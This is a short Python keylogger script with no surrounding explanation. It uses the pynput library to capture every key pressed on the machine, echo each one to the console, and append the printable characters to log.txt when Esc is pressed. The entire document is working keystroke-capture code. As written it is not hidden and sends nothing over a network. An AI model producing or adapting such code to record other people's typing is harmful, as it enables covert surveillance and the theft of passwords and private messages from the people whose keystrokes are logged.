import pynput
from pynput.keyboard import Key, Listener
counter = 0
keys=[]
def on_press(key):
    global keys, counter
    keys.append(key)
    print('{0} pressed'.format(key))
def write_files ():
    global keys
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
        keys = []
def on_release(key):
    if key == Key.esc:
        write_files()
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()